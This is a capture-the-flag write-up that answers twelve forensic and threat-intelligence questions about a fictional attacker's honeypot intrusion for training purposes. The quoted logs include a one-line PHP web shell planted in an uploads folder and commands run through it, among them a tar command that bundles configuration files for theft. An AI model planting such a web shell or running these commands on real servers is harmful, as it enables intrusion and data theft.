---
title: "Holmes CTF 2025 - The Card"
date: 2025-09-27T14:20:00+07:00
draft: false
categories: ["CTF", "writeup"]
cover: "/images/holmes_2025/the_card/anh1.png"
---

# Holmes CTF 2025 – The Card

![Challenge Banner](/images/holmes_2025/the_card/anh1.png)

Holmes CTF 2025 Event Link: https://ctf.hackthebox.com/event/2536  
Challenge name: **The Card**  
Difficulty: **Easy**  
Describe: Holmes receives a breadcrumb from Dr. Nicole Vale – fragments from a string of cyber incidents across Cogwork-1. Each lead ends the same way: a digital calling card signed JM.

--- 

## Question 1  
Analyze the provided logs and identify what is the first User-Agent used by the attacker against Nicole Vale's honeypot. (string)

*From the provided snippet of the access.log, we can see the following entry:
```velocity
2025-05-01 08:23:12 121.36.37.224 - - [01/May/2025:08:23:12 +0000] 
"GET /robots.txt HTTP/1.1" 200 847 "-" "Lilnunc/4A4D - SpecterEye"
```

Breaking it down:
Timestamp: 2025-05-01 08:23:12  
Source IP: 121.36.37.224 (attacker)  
Request: GET /robots.txt HTTP/1.1  
Response code: 200 (successful request)  
User-Agent: "Lilnunc/4A4D - SpecterEye"  

Since this is the earliest recorded request from the attacker, the User-Agent value clearly indicates the tool or script they were using.

Conclusion:  
```velocity
Lilnunc/4A4D - SpecterEye
```

---

## Question 2:  
It appears the threat actor deployed a web shell after bypassing the WAF. What is the file name? (filename.ext)

Log Analysis:
1. Application log evidence
In application.log, we see that the attacker successfully deployed a backdoor web shell:
```velocity
2025-05-15 11:25:01 [CRITICAL] webapp.api.v2.debug - Backdoor deployment initiated by 121.36.37.224 - command: 'echo "&lt;?php system($_GET["cmd"]); ?&gt;" > /var/www/html/uploads/temp_4A4D.php'
2025-05-15 11:25:12 [CRITICAL] webapp.api.v2.debug - Web shell created at /uploads/temp_4A4D.php by 121.36.37.224
```

This shows the exact filename and path of the malicious PHP web shell: `/uploads/temp_4A4D.php`

2. Access log confirmation
Later, the attacker starts interacting with the uploaded file:
```velocity
2025-05-18 15:02:12 121.36.37.224 "GET /uploads/temp_4A4D.php?cmd=ls -la /var/www/html/uploads/" ...
2025-05-18 15:02:23 121.36.37.224 "GET /uploads/temp_4A4D.php?cmd=whoami" ...
2025-05-18 15:02:34 121.36.37.224 "GET /uploads/temp_4A4D.php?cmd=tar -czf /tmp/exfil_4A4D.tar.gz /var/www/html/config/ /var/log/webapp/" ...
```

Here we clearly see the attacker executing system commands (ls, whoami, tar) through the PHP web shell.

3. WAF log observation
The WAF also detected this malicious activity but shows that the attacker bypassed protections:
```velocity
2025-05-15 11:25:12 [CRITICAL] waf.exec - IP 121.36.37.224 - Rule: WEBSHELL_DEPLOYMENT - Action: BYPASS - PHP web shell temp_4A4D.php created
```

Conclusion:  
```velocity
temp_4A4D.php
```

---

## Question 3:  
The threat actor also managed to exfiltrate some data. What is the name of the database that was exfiltrated? (filename.ext)

Log Analysis:
1. Access log evidence
From the access.log, we can see the attacker downloading a large SQL file:
```velocity
2025-05-18 14:58:23 121.36.37.224 - - [18/May/2025:15:58:23 +0000] 
"GET /uploads/database_dump_4A4D.sql HTTP/1.1" 200 52428800 "-" "4A4D RetrieveR/1.0.0"
```

This indicates a successful download of the file `database_dump_4A4D.sql`.

2. Application log confirmation
The application log also records this exfiltration attempt:
```velocity
2025-05-18 14:58:23 [CRITICAL] webapp.security - Database dump accessed - database_dump_4A4D.sql downloaded by 121.36.37.224
```

3. WAF log validation
Finally, the WAF confirms the event, showing the attacker bypassed protections:
```velocity
2025-05-18 14:58:23 [CRITICAL] waf.exec - IP 121.36.37.224 - Rule: DATABASE_DOWNLOAD - Action: BYPASS - Database file download: database_dump_4A4D.sql
```

Conclusion:  
```velocity
database_dump_4A4D.sql
```

---

## Question 4:  
During the attack, a seemingly meaningless string seems to be recurring. Which one is it? (string)

Log Analysis:
Reviewing the logs across different stages of the attack, one specific string keeps showing up:
- User-Agent: `Lilnunc/4A4D - SpecterEye`  
- Web shell filename: `temp_4A4D.php`  
- Exfiltrated files: `backup_2025_4A4D.tar.gz`, `database_dump_4A4D.sql`, `config_4A4D.json`  
- Backdoor & persistence mechanisms: `/tmp/.system_update_4A4D`, SSH key named `backdoor_4A4D`

Across reconnaissance, exploitation, persistence, and exfiltration, the attacker consistently embeds the same marker.

Conclusion:  
```velocity
4A4D
```

---

## Question 5:  
OmniYard-3 (formerly Scotland Yard) has granted you access to its CTI platform. Browse to the first IP:port address and count how many campaigns appear to be linked to the honeypot attack.

![CTI Graph](/images/holmes_2025/the_card/anh2.png)

Analysis:
1. Accessing the CTI platform
We were given three possible Docker instances to investigate:
http://94.237.51.202:31849/
http://94.237.51.202:52486/
http://94.237.51.202:40489/
The first one (:31849) loads the CogWork-Intel Graph interface, as shown in the screenshot.
2. Entity types and connections
In the graph view, different types of entities are shown with unique colors:
-Campaigns (red)
-Infrastructure, Indicators, Malware, Tools, Organizations, etc.
3. Identifying the honeypot attack link
On the left, we see an Investigation Alert:
-“JM signature (4A4D) detected across multiple breach campaigns. Investigate entity connections for attribution patterns.”
-This confirms the platform has associated the attacker’s recurring marker (4A4D) with several campaigns.
4. Counting campaigns
Looking at the graph:
-The entity labeled JM (center node, related to Nicole Vale’s honeypot) is connected to five red nodes.
-Each red node corresponds to a campaign entity.
-This means the CTI platform has correlated the honeypot attack with five separate campaigns.
Conclusion:
The honeypot attack is linked to:
```velocity
5
```

---

## Question 6:  
How many tools and malware in total are linked to the previously identified campaigns? (number)
-Analysis:
1. From Question 5, we already identified that the honeypot attack (JM signature 4A4D) is linked to 5 campaigns.
2. In the CogWork-Intel Graph view (screenshot of http://94.237.51.202:31849/), each campaign node (red) has connections to other entities such as:
- Tools (brown)
- Malware (dark red)
3. By counting all the tools and malware linked to those 5 campaigns, we get a total of 9 entities.
Conclusion:
The total number of tools and malware linked to the identified campaigns is:
```velocity
9
```

---

## Question 7:  
It appears that the threat actor has always used the same malware in their campaigns. What is its SHA-256 hash? (sha-256 hash)
Analysis:
1. In the CogWork-Intel Graph view (http://94.237.51.202:31849/), selecting the malware indicator entity (indicator--bio-falsifier-hash-2025-0004) reveals its details.
2. On the right-hand side under Description and Properties, we see the malware identified as BioMetric Falsifier targeting medical monitoring systems.
3. The Pattern field provides the hash value:
```velocity
{file:hashes.SHA256 = '7477c4f5e6d7c8b9a0f1e2d3c4b5a6f7e8d9c0b1a2f3e4d5c6b7a8f9e0d17477'}
```
![Malware Hash](/images/holmes_2025/the_card/anh3.png)

This confirms the SHA-256 hash of the recurring malware.
Conclusion:
```velocity
7477c4f5e6d7c8b9a0f1e2d3c4b5a6f7e8d9c0b1a2f3e4d5c6b7a8f9e0d17477
```

---

## Question 8:  
Browse to the second IP:port address and use the CogWork Security Platform to look for the hash and locate the IP address to which the malware connects. (Credentials: nvale/CogworkBurning!)
Analysis:
1. Accessing the platform
When logging into the second instance (http://94.237.51.202:52486/) with the provided credentials, we can search for the malware hash previously identified in Question 7:
```velocity
7477c4f5e6d7c8b9a0f1e2d3c4b5a6f7e8d9c0b1a2f3e4d5c6b7a8f9e0d17477
```
2. Detailed malware analysis
The malware is shown as neurostorm_implant_4A4D.bin with the following attributes:
File Type: ELF 64-bit executable
Detections: 45/72 engines flagging it as malicious
Attribution: James Moriarty–themed attacks
Campaign ID: 4A4D-NEUROSTORM
3. Critical infrastructure
Scrolling down in the analysis view, under Critical C2 Infrastructure, we find the following entry:
```velocity
74.77.74.77
Primary Command & Control Server
Ports: 443, 8080, 4444
```
This identifies the IP address the malware communicates with.
Conclusion:
```velocity
74.77.74.77
```

---

## Question 9:  
What is the full path of the file that the malware created to ensure its persistence on systems? (/path/filename.ext)

![Persistence Evidence](/images/holmes_2025/the_card/anh4.png)  
Analysis:
From the CogWork Security Platform – Behavioral Analysis section, we can observe the malware’s activity:

*Network Activity

-HTTPS → 74.77.74.77:443
-TCP → 74.77.74.77:7474 (Backdoor listener port)
-TCP → 74.77.74.77:8080 (Secondary C2 channel)
-DNS → 4a4d-nullinc.revenge.onion (Tor hidden service)

*File Operations

```velocity
CREATE → /opt/lilnunc/implant/4a4d_persistence.sh   (21:46:30 20/7/2025)
CREATE → /etc/lilnunc/4a4d_config.xml               (21:46:45 20/7/2025)
```
![Persistence File](/images/holmes_2025/the_card/anh5.png)

*Registry Operations
- MODIFY → /etc/rc.local
Conclusion:
```velocity
/opt/lilnunc/implant/4a4d_persistence.sh
```

---

## Question 10:  
Finally, browse to the third IP:port address and use the CogNet Scanner Platform to discover additional details about the TA's infrastructure. How many open ports does the server have?

![Open Ports](/images/holmes_2025/the_card/anh6.png)

Analysis:
1. Accessing the platform
Navigating to the third instance (http://94.237.51.202:40489/) loads the CogNet Scanner interface.

2. Searching for the C2 server
We query the previously identified C2 IP address:74.77.74.77

3. Scan results
The scanner flags the host and displays its details:
-Location: United Kingdom (CogWork-1 Networks)
-Role: Enterprise Management Server
-Status: Flagged as malicious

4. Open ports
The result lists the following services:

```velocity
22/tcp    ssh
25/tcp    smtp
53/udp    dns
80/tcp    http
110/tcp   pop3
143/tcp   imap
443/tcp   https
3389/tcp  rdp
7477/tcp  unknown
8080/tcp  http-proxy
8443/tcp  https-alt

Counting them gives a total of 11 open ports.

Conclusion:
```velocity
11
```

---

## Question 11:  
Which organization does the previously identified IP belong to? (string)

![Organization Evidence](/images/holmes_2025/the_card/anh7.png)

Analysis:

1. From Question 10, we identified the threat actor’s C2 server as 74.77.74.77.

2. Using the CogNet Scanner Platform (http://94.237.51.202:40489/), the Overview tab of the scan results provides network information.

3. The details show:
- IP Address: 74.77.74.77
- Device Type: Enterprise Management Server
- Operating System: Ubuntu Server 18.04 LTS
- Hostname: msp-sense-33.local
- Organization: SenseShield MSP
Thus, the organization linked to the IP is SenseShield MSP.
Conclusion:
```velocity
SenseShield MSP
```
Conclusion:  
```velocity
SenseShield MSP
```

---

## Question 12:  
One of the exposed services displays a banner containing a cryptic message. What is it? (string)

![Service Banner](/images/holmes_2025/the_card/anh8.png)

Analysis:

1. Using the CogNet Scanner Platform (http://94.237.51.202:40489/), we switched to the Services tab to review banners from all detected open ports.

2. Most services displayed standard banners (e.g., OpenSSH, Postfix SMTP, Dovecot POP3/IMAP, nginx).

3. However, the service running on port 7477/tcp (unknown service) revealed a unique banner containing a cryptic phrase:He's a ghost I carry, not to haunt me, but to hold me 
together - NULLINC REVENGE

Conclusion:

```velocity
He's a ghost I carry, not to haunt me, but to hold me together - NULLINC REVENGE
```
